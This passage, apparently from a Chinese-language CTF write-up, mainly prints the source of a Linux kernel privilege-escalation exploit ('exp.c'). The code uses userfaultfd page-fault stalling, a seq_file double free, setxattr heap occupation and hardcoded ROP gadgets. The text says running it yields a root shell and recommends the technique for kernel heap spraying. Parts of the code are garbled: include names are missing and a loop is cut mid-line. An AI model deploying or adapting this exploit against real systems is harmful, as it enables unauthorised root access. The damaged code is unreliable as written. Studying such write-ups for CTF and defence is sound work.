        int (*tiocmget)(struct tty_struct *tty);
        int (*tiocmset)(struct tty_struct *tty,
                unsigned int set, unsigned int clear);
        int (*resize)(struct tty_struct *tty, struct winsize *ws);
        int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
        int (*get_icount)(struct tty_struct *tty,
                    struct serial_icounter_struct *icount);
        void (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);
    #ifdef CONFIG_CONSOLE_POLL
        int (*poll_init)(struct tty_driver *driver, int line, char *options);
        int (*poll_get_char)(struct tty_driver *driver, int line);
        void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
    #endif
        const struct file_operations *proc_fops;
    };
> exp.c
    #define _GNU_SOURCE
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include "kernelpwn.h"
    int             dev_fd;
    size_t          seq_fd;
    size_t          seq_fd_reserve[0x100];
    static char     *page = NULL;
    static size_t   page_size;
    static void *
    leak_thread(void *arg)
    {
        struct uffd_msg msg;
        int fault_cnt = 0;
        long uffd;
        struct uffdio_copy uffdio_copy;
        ssize_t nread;
        uffd = (long) arg;
        for (;;) 
        {
            struct pollfd pollfd;
            int nready;
            pollfd.fd = uffd;
            pollfd.events = POLLIN;
            nready = poll(&pollfd, 1, -1);
            if (nready == -1)
                errExit("poll");
            nread = read(uffd, &msg, sizeof(msg));
            if (nread == 0)
                errExit("EOF on userfaultfd!\n");
            if (nread == -1)
                errExit("read");
            if (msg.event != UFFD_EVENT_PAGEFAULT)
                errExit("Unexpected event on userfaultfd\n");
            puts("[*] push trapped in userfaultfd.");
            pop(&kernel_offset);
            printf("[*] leak ptr: %p\n", kernel_offset);
            kernel_offset -= 0xffffffff81c37bc0;
            kernel_base += kernel_offset;
            uffdio_copy.src = (unsigned long) page;
            uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
                                                  ~(page_size - 1);
            uffdio_copy.len = page_size;
            uffdio_copy.mode = 0;
            uffdio_copy.copy = 0;
            if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
                errExit("ioctl-UFFDIO_COPY");
            return NULL;
        }
    }
    static void *
    double_free_thread(void *arg)
    {
        struct uffd_msg msg;
        int fault_cnt = 0;
        long uffd;
        struct uffdio_copy uffdio_copy;
        ssize_t nread;
        uffd = (long) arg;
        for (;;) 
        {
            struct pollfd pollfd;
            int nready;
            pollfd.fd = uffd;
            pollfd.events = POLLIN;
            nready = poll(&pollfd, 1, -1);
            if (nready == -1)
                errExit("poll");
            nread = read(uffd, &msg, sizeof(msg));
            if (nread == 0)
                errExit("EOF on userfaultfd!\n");
            if (nread == -1)
                errExit("read");
            if (msg.event != UFFD_EVENT_PAGEFAULT)
                errExit("Unexpected event on userfaultfd\n");
            puts("[*] pop trapped in userfaultfd.");
            puts("[*] construct the double free...");
            pop(page);
            uffdio_copy.src = (unsigned long) page;
            uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
                                                  ~(page_size - 1);
            uffdio_copy.len = page_size;
            uffdio_copy.mode = 0;
            uffdio_copy.copy = 0;
            if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
                errExit("ioctl-UFFDIO_COPY");
            return NULL;
        }
    }
    size_t  pop_rdi_ret = 0xffffffff81034505;
    size_t  xchg_rax_rdi_ret = 0xffffffff81d8df6d;
    size_t  mov_rdi_rax_pop_rbp_ret = 0xffffffff8121f89a;
    size_t  swapgs_restore_regs_and_return_to_usermode = 0xffffffff81600a34;
    long    flag_fd;
    char    flag_buf[0x100];
    static void *
    hijack_thread(void *arg)
    {
        struct uffd_msg msg;
        int fault_cnt = 0;
        long uffd;
        struct uffdio_copy uffdio_copy;
        ssize_t nread;
        uffd = (long) arg;
        for (;;) 
        {
            struct pollfd pollfd;
            int nready;
            pollfd.fd = uffd;
            pollfd.events = POLLIN;
            nready = poll(&pollfd, 1, -1);
            if (nready == -1)
                errExit("poll");
            nread = read(uffd, &msg, sizeof(msg));
            if (nread == 0)
                errExit("EOF on userfaultfd!\n");
            if (nread == -1)
                errExit("read");
            if (msg.event != UFFD_EVENT_PAGEFAULT)
                errExit("Unexpected event on userfaultfd\n");
            puts("[*] setxattr trapped in userfaultfd.");
            puts("[*] trigger now...");
            for (int i = 0; i stat, trigger in uffd thread
        seq_fd = open("/proc/self/stat", O_RDONLY);
        setxattr("/exp", "arttnba3", uffd_buf_hack + page_size - 8, 32, 0);
    }
运行即可 get root shell
## 0xFF.What’s more?
userfaultfd + setxattr
毫无疑问是一个十分巧妙的技术，除了笔者在本篇文章中所叙述的“堆占位”技术以外，他更多的被用于在内核空间中完成“堆喷射”，相比起 sendmsg
等传统堆喷射技术，这一技术的限制无疑少了很多，且也更为灵活
笔者将在后续的其他文章中叙述如何利用 userfaultfd + setxattr 这一技术完成堆喷射